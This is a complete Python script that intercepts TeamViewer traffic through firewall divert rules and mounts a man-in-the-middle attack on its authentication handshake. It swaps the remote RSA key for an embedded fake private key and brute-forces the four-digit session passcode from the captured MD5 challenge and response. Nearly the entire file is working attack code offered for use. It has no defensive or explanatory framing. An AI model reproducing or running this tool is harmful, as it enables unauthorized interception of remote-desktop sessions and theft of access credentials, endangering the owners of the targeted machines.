#!/usr/bin/python
# Divert teamviewer traffic using divert socket and MITM the authentication protocol to produce the entered passcode

from twisted.internet.protocol import Factory, Protocol
from twisted.internet.endpoints import TCP4ServerEndpoint
from twisted.internet import reactor
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Cipher import ARC4
import struct,string,zlib,sys,hashlib,socket,struct,IN,signal,fcntl,os,pcappy,time,zlib

DO_PCAP_DUMP = False
mitm_for_ip = {}

class TCPHandler(object):
	def __init__(self, ifname, port, debug=False):
		self.debug = debug
		self.port = port
		self.tcp_stream_dict = {}
		self.ipaddr = self.get_ip_for_interface(ifname)
		if DO_PCAP_DUMP:
			self.pcap_o = pcappy.PcapPyDead(linktype=pcappy.datalink_name_to_val("RAW"), snaplen=0)
			self.pcap_dumper = self.pcap_o.dump_open("/tmp/after_divert.pcap")
		if not self.ipaddr: raise Exception("Bad IP","Cannot get IP for interface %s"%ifname)
		print "Diverting traffic..."
	def get_ip_for_interface(self, ifname):
		s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		ifreq = struct.pack('32s',ifname[:15])
		try: out_ip = socket.inet_ntoa(fcntl.ioctl(s.fileno(),0xc0206921,ifreq)[20:24])
		except: out_ip = None
		s.close()
		return out_ip
	def normalize_checksum(self, aValue):
		aValue = (aValue >> 16) + (aValue & 0xFFFF)
		aValue += (aValue >> 16)
		return (~aValue & 0xFFFF)
	def compute_checksum(self, aString):
		nleft = len(aString)
		sum,pos = 0,0
		while nleft > 1:
			sum = ord(aString[pos]) * 256 + (ord(aString[pos + 1]) + sum)
			pos = pos + 2
			nleft = nleft - 2
		if nleft == 1:
			sum = sum + ord(aString[pos]) * 256
		return self.normalize_checksum(sum)
	def compute_ip_checksum(self, raw_pkt):
		# zero checksum
		raw_pkt = raw_pkt[0:10]+struct.pack(">H",0)+raw_pkt[12:20]
		# compute
		return self.compute_checksum(raw_pkt[0:20])
	def calculate_tcp_checksum(self, raw_pkt):
		# zero checksum
		raw_pkt = raw_pkt[0:36]+struct.pack(">H",0)+raw_pkt[38:]
		# create pseudo buf
		pseudo_buf = raw_pkt[12:20]+"\x00"+raw_pkt[9:10]
		pseudo_buf += struct.pack(">H", len(raw_pkt[20:]))
		chk_buf = pseudo_buf + raw_pkt[20:]
		# compute
		return self.compute_checksum(chk_buf)
	def fix_up_checksums(self, raw_pkt):
		# fix TCP checksum
		calc_tcpsum = self.calculate_tcp_checksum(raw_pkt)
		raw_pkt = raw_pkt[0:36]+struct.pack(">H",calc_tcpsum)+raw_pkt[38:]
		# fix IP checksum
		calc_sum = self.compute_ip_checksum(raw_pkt[0:20])
		raw_pkt = raw_pkt[0:10]+struct.pack(">H",calc_sum)+raw_pkt[12:]
		return raw_pkt
	def update_stream_dict(self, flags, is_out, dst, dport, src, sport):
		return_spoof = None
		# outgoing SYN
		if is_out and flags & 0x02:
			dict_key = "%s:%d" % (src,sport)
			if self.debug: print "\tNew connection with key",dict_key
			if dict_key in self.tcp_stream_dict:
				# duplicate SYN
				if self.debug: print "\t!Warning: duplicate SYN packet!"
			self.tcp_stream_dict[dict_key] = {'dst':dst, 'dport':dport, 'src':src, 'sport':sport}
		# incoming SYN
		elif not is_out and flags & 0x10:
			dict_key = "%s:%d" % (dst,dport)
			if dict_key not in self.tcp_stream_dict:
				if self.debug: print "\t!Warning: received incoming pkt not in dict!"
				return None
			if self.debug: print "\tIncoming with key",dict_key
			update_entry = self.tcp_stream_dict[dict_key]
			if 'fin' in update_entry:
				update_entry['fin'] = update_entry['fin']+1
			elif flags & 0x01:
				update_entry['fin'] = 1
			self.tcp_stream_dict[dict_key] = update_entry
			return_spoof = update_entry['dst']
			if flags & 0x04 and dict_key in self.tcp_stream_dict: # RST
				del self.tcp_stream_dict[dict_key]
			if 'fin' in update_entry and update_entry['fin']==4 and dict_key in self.tcp_stream_dict:
				del self.tcp_stream_dict[dict_key]
		elif is_out and flags & 0x10:
			dict_key = "%s:%d" % (src,sport)
			if dict_key not in self.tcp_stream_dict:
				if self.debug: print "\t!Warning: Received incoming ACK message not in dict!"
				return None
			update_entry = self.tcp_stream_dict[dict_key]
			if 'fin' in update_entry:
				update_entry['fin'] = update_entry['fin']+1
			elif flags & 0x01:
				update_entry['fin'] = 1
			self.tcp_stream_dict[dict_key] = update_entry
			if 'fin' in update_entry and update_entry['fin']==4:
				del self.tcp_stream_dict[dict_key]
		if self.debug: print "\t",self.tcp_stream_dict
		if return_spoof != None:
			return socket.inet_aton(return_spoof)
		return None
	def handlePacket(self, raw_pkt, is_incoming):
		global mitm_for_ip
		(vhl, tos, totlen, id, off, ttl, prot, sum, src, dst) = struct.unpack(">BBHHHBBH4s4s", raw_pkt[0:20])
		(sport, dport, tcpseq, tcpack, hdrlen, flags, window, tcpsum, urgptr) = struct.unpack(">HHIIBBHHH", raw_pkt[20:40])
		data_ptr = 20+(hdrlen>>2)
		#print "HANDLE PACKET",socket.inet_ntoa(src),"->",socket.inet_ntoa(dst),sport,dport,"%08x"%tcpseq,is_incoming
		# outgoing TV
		replacement_data = None
		if dport == self.port:
			if self.debug: print "Out Pkt from %s:%d to %s:%d: flg %02x seq %08x/%08x" % (socket.inet_ntoa(src),sport,socket.inet_ntoa(dst),dport,flags,tcpseq,tcpack),is_incoming,raw_pkt[data_ptr:].encode('hex')
			self.update_stream_dict(flags, True, socket.inet_ntoa(dst), dport, socket.inet_ntoa(src), sport)
			if socket.inet_ntoa(src) not in mitm_for_ip:
				mitm_for_ip[socket.inet_ntoa(src)] = TeamViewerMITM()
			try:
				replacement_data = mitm_for_ip[socket.inet_ntoa(src)].dataReceived(raw_pkt[data_ptr:], False)
			except:
				print "Exception:",sys.exc_info()
		elif sport == self.port:
			self.update_stream_dict(flags, False, socket.inet_ntoa(dst), dport, socket.inet_ntoa(src), sport)
			if self.debug: print "In Pkt from %s:%d to %s:%d: flg %02x seq %08x/%08x" % (socket.inet_ntoa(src),sport,socket.inet_ntoa(dst),dport,flags,tcpseq,tcpack),is_incoming,raw_pkt[data_ptr:].encode('hex')
			if socket.inet_ntoa(dst) in mitm_for_ip:
				try:
					replacement_data = mitm_for_ip[socket.inet_ntoa(dst)].dataReceived(raw_pkt[data_ptr:], True)
				except:
					print "Exception:",sys.exc_info()
		if replacement_data != None:
			new_totlen = data_ptr+len(replacement_data)
			new_raw_pkt =  struct.pack(">BBHHHBBH4s4s", vhl, tos, new_totlen, id, off, ttl, prot, sum, src, dst)
			new_raw_pkt += struct.pack(">HHIIBBHHH", sport, dport, tcpseq, tcpack, hdrlen, flags, window, tcpsum, urgptr)
			new_raw_pkt += raw_pkt[40:data_ptr] # tcp options
			new_raw_pkt += replacement_data
			raw_pkt = self.fix_up_checksums(new_raw_pkt)

		if DO_PCAP_DUMP:
			now = time.time()
			hdr = {"caplen":len(raw_pkt), "len":len(raw_pkt), "ts":{"tv_sec":int(now), "tv_usec":int(round(now * 1000)%1000)}}
			self.pcap_dumper.dump(hdr, raw_pkt)
			self.pcap_dumper.flush()

		return raw_pkt

fw_rule_num = 400
signal_handlers = {}
def handle_signal(sig, frame):
	if sig not in signal_handlers: return
	for handler in signal_handlers[sig]:
		handler(sig, frame)
class TCPDivert(object):
	def __init__(self, divertPort, tcpHandler):
		self.divertPort = divertPort
		self.fw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, IN.IPPROTO_DIVERT)
		self.sock.bind(('0.0.0.0', self.divertPort))
		self.tcpHandler = tcpHandler
		reactor.addReader(self)
		self.divert_out = None
		self.divert_in = None
		self.createFirewallRules()
		global signal_handlers
		if signal.SIGINT not in signal_handlers: 
			signal_handlers[signal.SIGINT] = []
			signal.signal(signal.SIGINT, handle_signal)
		signal_handlers[signal.SIGINT].append(self.removeFirewallRules)
	def removeFirewallRules(self, sig, frame):
		#print "Remove firewall rules",sig
		if self.divert_out: so_res = self.fw_sock.setsockopt(socket.IPPROTO_IP, IN.IP_FW_DEL, self.divert_out)
		if so_res: raise Exception("setsockopt","setsockopt failed: %s"%(str(so_res)))
		if self.divert_out: so_res = self.fw_sock.setsockopt(socket.IPPROTO_IP, IN.IP_FW_DEL, self.divert_in)
		if so_res: raise Exception("setsockopt","setsockopt failed: %s"%(str(so_res)))
		self.fw_sock.close()
		try: reactor.stop()
		except: pass
	def createFirewallRules(self):
		# set firewall rule
		global fw_rule_num
		(O_NOP,O_IP_SRC,O_IP_SRC_MASK,O_IP_SRC_ME,O_IP_SRC_SET,O_IP_DST,O_IP_DST_MASK,O_IP_DST_ME,O_IP_DST_SET,O_IP_SRCPORT,O_IP_DSTPORT,
			O_PROTO,O_MACADDR2,O_MAC_TYPE,O_LAYER2,O_IN,O_FRAG,O_RECV,O_XMIT,O_VIA,O_IPOPT,O_IPLEN,O_IPID,O_IPTOS,O_IPPRECEDENCE,O_IPTTL,
			O_IPVER,O_UID,O_GID,O_ESTAB,O_TCPFLAGS,O_TCPWIN,O_TCPSEQ,O_TCPACK,O_ICMPTYPE,O_TCPOPTS,O_VERREVPATH,O_PROBE_STATE,O_KEEP_STATE,
			O_LIMIT,O_LIMIT_PARENT,O_LOG,O_PROB,O_CHECK_STATE,O_ACCEPT,O_DENY,O_REJECT,O_COUNT,O_SKIPTO,O_PIPE,O_QUEUE,O_DIVERT,O_TEE,
			O_FORWARD_IP,O_FORWARD_MAC) = range(0,55)
		# add divert self.divertPort tcp from any to any dst-port self.divertPort
		instr_data = struct.pack("BBHBBHHH", O_PROTO, 1, socket.IPPROTO_TCP, O_IP_DSTPORT, 2, 1, self.divertPort, self.divertPort)
		acts_of = len(instr_data)/4
		instr_data += struct.pack("BBH", O_DIVERT, 1, self.divertPort)
		(ipfw_vers,cmd_len,rule_num,rule_set) = (30, len(instr_data)/4, fw_rule_num, 0)
		fw_rule_num += 10
		self.divert_out = struct.pack("IPPPHHHBxIIQQQIII", ipfw_vers, 0, 0, 0, acts_of, cmd_len, rule_num, rule_set, 0, 0, 0, 0, 0, 0, 0, 0)
		self.divert_out += instr_data
		so_res = self.fw_sock.setsockopt(socket.IPPROTO_IP, IN.IP_FW_ADD, self.divert_out)
		if so_res: raise Exception("setsockopt","setsockopt failed: %s"%(str(so_res)))
		
		# add divert self.divertPort tcp from any self.divertPort to any
		instr_data = struct.pack("BBHBBHHH", O_PROTO, 1, socket.IPPROTO_TCP, O_IP_SRCPORT, 2, 1, self.divertPort, self.divertPort)
		acts_of = len(instr_data)/4
		instr_data += struct.pack("BBH", O_DIVERT, 1, self.divertPort)
		(ipfw_vers,cmd_len,rule_num,rule_set) = (30, len(instr_data)/4, fw_rule_num, 0)
		fw_rule_num += 10
		self.divert_in = struct.pack("IPPPHHHBxIIQQQIII", ipfw_vers, 0, 0, 0, acts_of, cmd_len, rule_num, rule_set, 0, 0, 0, 0, 0, 0, 0, 0)
		self.divert_in += instr_data
		so_res = self.fw_sock.setsockopt(socket.IPPROTO_IP, IN.IP_FW_ADD, self.divert_in)
		if so_res: raise Exception("setsockopt","setsockopt failed: %s"%(str(so_res)))
	def logPrefix(self):
		return "TCPDivert %d"%self.divertPort
	def fileno(self):
		return self.sock.fileno()
	def doRead(self):
		(raw_pkt,fromaddr) = self.sock.recvfrom(4096)
		#print "%s read %d bytes from %s"%(self.logPrefix(),len(raw_pkt),fromaddr)
		is_incoming = (fromaddr[0]!=None and fromaddr[0]!="0.0.0.0")
		out_pkt = self.tcpHandler.handlePacket(raw_pkt, is_incoming)
		self.sock.sendto(out_pkt, fromaddr)
	def connectionLost(self, reason):
		print "TCPDivert connection lost"
		try: self.removeFirewallRules(0, 0)
		except: pass

def wchar_string(data):
	if len(data)%2 != 0:
		return None
	chrs = [struct.unpack("<H", data[x:x+2])[0] for x in range(0,len(data), 2)]
	if chrs[-1] != 0:
		return None
	for chrv in chrs[:-1]:
		if chrv > 128:
			return None
	return "".join(chr(x) for x in chrs[:-1])

tv_commands = {10:"CMD_IDENTIFY", 11:"CMD_REQUESTCONNECT", 13:"CMD_DISCONNECT", 14:"CMD_VNCDISCONNECT", 15:"CMD_TVCONNECTIONFAILED", 16:"CMD_PING", 17:"CMD_PINGOK", 18:"CMD_MASTERCOMMAND", 19:"CMD_MASTERRESPONSE", 20:"CMD_CHANGECONNECTION", 21:"CMD_NOPARTNERCONNECT", 22:"CMD_CONNECTTOWAITINGTHREAD", 23:"CMD_SESSIONMODE", 24:"CMD_REQUESTROUTINGSESSION", 25:"CMD_TIMEOUT", 26:"CMD_JAVACONNECT", 27:"CMD_KEEPALIVEBEEP", 28:"CMD_REQUESTKEEPALIVE", 29:"CMD_MASTERCOMMAND_ENCRYPTED", 30:"CMD_MASTERRESPONSE_ENCRYPTED", 31:"CMD_REQUESTRECONNECT", 32:"CMD_RECONNECTTOWAITINGTHREAD", 33:"CMD_STARTLOGGING", 34:"CMD_SERVERAVAILABLE", 35:"CMD_KEEPALIVEREQUEST", 36:"CMD_OK", 37:"CMD_FAILED", 38:"CMD_PING_PERFORMANCE", 39:"CMD_PING_PERFORMANCE_RESPONSE", 40:"CMD_REQUESTKEEPALIVE2", 41:"CMD_DISCONNECT_SWITCHEDTOUDP", 42:"CMD_SENDMODE_UDP", 43:"CMD_KEEPALIVEREQUEST_ANSWER", 44:"CMD_ROUTE_CMD_TO_CLIENT", 45:"CMD_NEW_MASTERLOGIN", 46:"CMD_BUDDY", 47:"CMD_ACCEPTROUTINGSESSION", 48:"CMD_NEW_MASTERLOGIN_ANSWER", 49:"CMD_BUDDY_ENCRYPTED", 50:"CMD_REQUEST_ROUTE_BUDDY", 51:"CMD_CONTACT_OTHER_MASTER", 52:"CMD_REQUEST_ROUTE_ENCRYPTED", 53:"CMD_ENDSESSION", 54:"CMD_SESSIONID", 55:"CMD_RECONNECT_TO_SESSION", 56:"CMD_RECONNECT_TO_SESSION_ANSWER", 57:"CMD_MEETING_CONTROL", 58:"CMD_CARRIER_SWITCH", 59:"CMD_MEETING_AUTHENTICATION", 60:"CMD_ROUTERCMD", 61:"CMD_PARTNERRECONNECT", 62:"CMD_CONGRESTION_CONTROL", 63:"CMD_ACK", 70:"CMD_UDPREQUESTCONNECT", 71:"CMD_UDPPING", 72:"CMD_UDPREQUESTCONNECT_VPN", 90:"CMD_DATA", 91:"CMD_DATA2", 92:"CMD_DATA_ENCRYPTED", 93:"CMD_REQUESTENCRYPTION", 94:"CMD_CONFIRMENCRYPTION", 95:"CMD_ENCRYPTIONREQUESTFAILED", 96:"CMD_REQUESTNOENCRYPTION", 97:"CMD_UDPFLOWCONTROL", 98:"CMD_DATA3", 99:"CMD_DATA3_ENCRYPTED", 100:"CMD_DATA3_RESENDPACKETS", 101:"CMD_DATA3_ACKPACKETS", 102:"CMD_AUTH_CHALLENGE", 103:"CMD_AUTH_RESPONSE", 104:"CMD_AUTH_RESULT", 105:"CMD_RIP_MESSAGES", 106:"CMD_DATA4", 107:"CMD_DATASTREAM", 108:"CMD_UDPHEARTBEAT", 109:"CMD_DATA_DIRECTED", 110:"CMD_UDP_RESENDPACKETS", 111:"CMD_UDP_ACKPACKETS", 112:"CMD_UDP_PROTECTEDCOMMAND", 113:"CMD_FLUSHSENDBUFFER"}

class TeamViewerMITM(object):
	def __init__(self):
		self.actual_remote_key = None
		self.cstream_info = [{"data":"", "idx":0, "cmp":zlib.decompressobj()}, {"data":"", "idx":0, "cmp":zlib.decompressobj()}]
		self.auth_challenge = None
		self.cstream_cnt = 0
		# this is just some random key I generated.  I was running into problems with generating it on the fly that I didn't feel like debugging.
		self.fake_rsa_key = RSA.importKey(
			"""-----BEGIN RSA PRIVATE KEY-----
			MIICXgIBAAKBgQDgH8Zq5Mn5z/fM7HiC7+f1AEgCKF7ltlmtJGro93VL2vKYVdq1
			gX9ivpY73GgH2XlMtSMqyEcyYVOxLCDzUtcG/zceLm4K6gLYgr0mWP57U3I43ogS
			phfuF1CcG5UKatI7EXo3XJs3iiGgIsyqAN83aZr1XNd0RZwevE+o3ZHyJQIDAQAB
			AoGBAMZgWafTylKrmZJw3FpJLu7UyOfgA98fgFCYo2iBX/k8Wu4rT+LINJCaUS+6
			7vnDrHIRAoejriERtJpljOTSti96WPIzUcsMq5ypNj79Kj0lfaRt4GaZT7f8ar+B
			IbuQj1HdFGLqK9q1LbcSi6dsIiGQaI5qIHCkff10geVjQVchAkEA4Hsm6EtAWHWZ
			tIXd7qliR9aPxd9vp3AVsP1RGbk81j+XG4BYMvFxrfz1hXa4Vxw1kdwdWGqz8EBL
			7w4qmbx3qwJBAP+XywRzOW89oCggTFG4FY0hq/DHDN5Jtxag+6ii3rGCtP51BGqY
			apc5noDwJk317YfpEwlER2z77NighvZzLW8CQQDZLayVvwAw1Q3w/jaaCRxBnk8Y
			xDP0zVbfFiVZesJmEb2y6LfsCXXPO9WZ2yM7e9pEFK37dbhCryIH1S/X7uPjAkEA
			mY7K7DuF0C2IIVN2RsqAODB4qsoMEyjalP/W8nQXszJCJ3aKVriHoZ9+eRzPBpuw
			P61qQHEDMJkSrPuU2lBMhQJAWnGyV0jl60AWaRQgV69YKvDSHUwDzXdR6L3JoWC/
			+LrgTIokwDQwB/AgamnfvwYoPF5CRcaWSK7tycBviuetxA==
			-----END RSA PRIVATE KEY-----""")
	def rightRotateString(self, string, bits):
		news = []
		for x in xrange(1,len(string)):
			newc = ((ord(string[x]) >> bits) | (ord(string[x-1]) << (8-bits))) & 0xff
			news.append("%c"%newc)
		newc = ((ord(string[0]) >> bits) | (ord(string[-1]) << (8-bits))) & 0xff
		if newc:
			news.insert(0, "%c"%newc)
		return "".join(news)
	def leftRotateString(self, string, bits):
		carry = 0
		news = []
		for x in xrange(len(string)-1):
			newc = ((ord(string[x]) << bits) | (ord(string[x+1]) >> (8-bits))) & 0xff
			news.append("%c"%newc)
		if len(string):
			newc = ((ord(string[-1]) << bits) | (ord(string[0]) >> (8-bits))) & 0xff
			news.append("%c"%newc)
		return "".join(news)
	def handle_master_response(self, response_comps, binary_part):
		if len(response_comps) == 3 and binary_part != None and response_comps[0] == "0" and response_comps[1] == "CONNECT":
			print "RequestRoute detected, modifying key..."

			key_header = dict(zip(["unknown","unknown2","key_type","keysize", "exponent"], struct.unpack("<II4sII", binary_part[:20])))
			assert key_header["key_type"] == "RSA1"
			key_n = binary_part[20:20+key_header["keysize"]/8][::-1] # swapped
			self.actual_remote_key = RSA.construct((long(key_n.encode("hex"), 16), long(key_header["exponent"])))
			print "Prior key:"
			print self.actual_remote_key.exportKey("PEM")
			print "Replacing with:"
			print self.fake_rsa_key.publickey().exportKey("PEM")

			self.cstream_info = [{"data":"", "idx":0, "cmp":zlib.decompressobj()}, {"data":"", "idx":0, "cmp":zlib.decompressobj()}]
			self.auth_challenge = None
			self.cstream_cnt = 0

			new_binary_part = struct.pack("<II4sII", 0x0206, 0xa400, "RSA1", self.fake_rsa_key.size()+1, self.fake_rsa_key.e)
			mod_size = (self.fake_rsa_key.size()+1)/8
			large_int_in_hex = hex(self.fake_rsa_key.n)[2:-1]
			large_int_in_hex += "0"*(2*mod_size-len(large_int_in_hex))
			new_binary_part += large_int_in_hex.decode("hex")[::-1]
			return "@".join(response_comps)+"&Binary="+new_binary_part

		return None

	def get_p2p_data(self, cmd, params):
		print "Serializing P2P:",cmd,params
		buddy_data = struct.pack("BB", cmd, len(params))
		for param_key in sorted(params.keys()):
			if isinstance(params[param_key], int):
				buddy_data += struct.pack("<BII", param_key, 4, params[param_key])
			elif (isinstance(params[param_key], str) or isinstance(params[param_key], unicode)) and all(x in string.printable for x in params[param_key]):
				buddy_data += struct.pack("<BI", param_key, (len(params[param_key])+1)*2)+"".join([struct.pack("<H", ord(x)) for x in params[param_key]])+"\x00\x00"
			else:
				buddy_data += struct.pack("<BI", param_key, len(params[param_key]))+params[param_key]
		print "Buddy data:",buddy_data.encode("hex")
		return buddy_data

	def handle_p2p_data(self, data, incoming):
		modify_data = None
		if incoming:
			print "\tIncoming",
		else:
			print "\tOutgoing",
		(cmd,pcnt) = struct.unpack("BB", data[:2])
		print "P2P Command: %d, %d parameters"%(cmd,pcnt)
		idx = 2
		params = {}
		for x in range(0,pcnt):
			(key,size) = struct.unpack("<BI", data[idx:idx+5])
			idx += 5
			print "\t\tKey: %d (size %d)"%(key,size),
			string = data[idx:idx+size]
			idx += size
			if size == 4:
				int_val = struct.unpack("<I",string)[0]
				print "int %d"%(int_val)
				params[key] = int_val
			else:
				w = wchar_string(string)
				if w:
					print "str %s"%w
					params[key] = w
				else:
					print "hex %s"%string.encode("hex")
					params[key] = string
		if cmd == 5:
			if 0 in params:
				print "Authentication challenge:",params[0].encode("hex")
				self.auth_challenge = params[0]
			elif 1 in params:
				print "Got authentication hash, brute-forcing credential"
				for x in range(0,9999):
					pw = "%04d"%x
					if hashlib.md5(self.auth_challenge+struct.pack("<HHHH", ord(pw[0]), ord(pw[1]), ord(pw[2]), ord(pw[3]))).digest() == params[1]:
						print "------------------------------"
						print "Found password:",pw
						print "------------------------------"
		return modify_data


	def dataReceived(self, data, is_incoming):
		replacement_data = None
		orig_data = data[:]
		while len(data) > 0:
			(magic,) = struct.unpack(">H", data[0:2])
			data_type = "Outgoing"
			if is_incoming:
				data_type = "Incoming"
			cmd_two_hdr = None
			if magic == 0x1724:
				(cmd,length) = struct.unpack("<BH", data[2:5])
				pkt_data = data[5:5+length]
				data = data[5+length:]
				if cmd != 46:
					decoded_pkt_data = self.leftRotateString(pkt_data, 1)
				else:
					decoded_pkt_data = pkt_data
			elif magic == 0x1130:
				(cmd,length) = struct.unpack("<BxI", data[2:8])
				cmd_two_hdr = dict(zip(["packet_id","request_id","command_class","offset"], struct.unpack("<IIII", data[8:24])))
				pkt_data = data[24:24+length]
				data = data[24+length:]
				if cmd == 93:
					decoded_pkt_data = self.leftRotateString(pkt_data, 1)
				else:
					decoded_pkt_data = pkt_data
			else:
				print "FAILURE"
				break

			print "\t%s %s received, length %d, magic 0x%04x"%(data_type, tv_commands[cmd], length, magic),

			if tv_commands[cmd] == "CMD_MASTERRESPONSE":
				print
				binary_part = None
				binary_idx = decoded_pkt_data.find("&Binary=")
				if decoded_pkt_data.find("&Binary=") > 0:
					binary_part = decoded_pkt_data[binary_idx+8:]
					decoded_pkt_data = decoded_pkt_data[:binary_idx]
				response_comps = decoded_pkt_data.split("@")
				print "Response:",response_comps
				new_master_response = self.handle_master_response(response_comps, binary_part)
				if new_master_response:
					#print "NEW MASTER:",new_master_response.encode("hex")
					replacement_data = struct.pack(">H",magic)+struct.pack("<BH", cmd, len(new_master_response))
					replacement_data += self.rightRotateString(new_master_response, 1)
			elif tv_commands[cmd] == "CMD_DATA4":
				print
				data_hdr = dict(zip(["data_id", "data_req_id", "is_encrypted", "maybe_cmd"], struct.unpack("<IIBBxx", decoded_pkt_data[:12])))
				data_data = decoded_pkt_data[12:]
				replace_data = None
				print "Data pkt_no %d"%self.cstream_cnt,
				if self.cstream_cnt < 2 and self.cstream_info[is_incoming]["idx"] < 12:
					self.cstream_cnt += 1
					print "Version:",data_data[:12]
					data_data = data_data[12:]
					self.cstream_info[is_incoming]["idx"] += 12
				else:
					if self.cstream_cnt == 2 and len(data_data):
						print "Uncompressed data:",data_data.encode("hex")
						self.cstream_info[is_incoming]["data"] += data_data
					else:
						print "Compressed data",data_data.encode("hex")
						self.cstream_info[is_incoming]["data"] += self.cstream_info[is_incoming]["cmp"].decompress(data_data)

					if len(self.cstream_info[is_incoming]["data"]):
						try:
							replace_data = self.handle_p2p_data(self.cstream_info[is_incoming]["data"], is_incoming)
							self.cstream_info[is_incoming]["idx"] += len(self.cstream_info[is_incoming]["data"])
							self.cstream_info[is_incoming]["data"] = ""
							self.cstream_cnt += 1
						except:
							print "Incomplete cstream data:",sys.exc_info()[1]
				if replace_data != None:
					new_data_command = struct.pack("<IIBBxx", data_hdr["data_id"], data_hdr["data_req_id"], data_hdr["is_encrypted"], data_hdr["maybe_cmd"])
					new_data_command += replace_data

					replacement_data = struct.pack(">H",magic)
					if magic == 0x1724:
						replacement_data += struct.pack("<BH", cmd, len(new_data_command))
					else:
						replacement_data += struct.pack("<BxI", cmd, len(new_data_command))
						replacement_data += struct.pack("<IIII", cmd_two_hdr["packet_id"], cmd_two_hdr["request_id"], cmd_two_hdr["command_class"], cmd_two_hdr["offset"])
					replacement_data += new_data_command
					
				
			elif len(decoded_pkt_data):
				print decoded_pkt_data[:32].encode("hex"),
				if len(decoded_pkt_data) > 32:
					print "..."
				else:
					print
			else:
				print
		return replacement_data

if len(sys.argv) < 2:
	print "Usage: divert_teamviewer_and_mitm.py <divert interface>"
	sys.exit(0)

td = TCPDivert(5938, TCPHandler(sys.argv[1], 5938))
reactor.run()
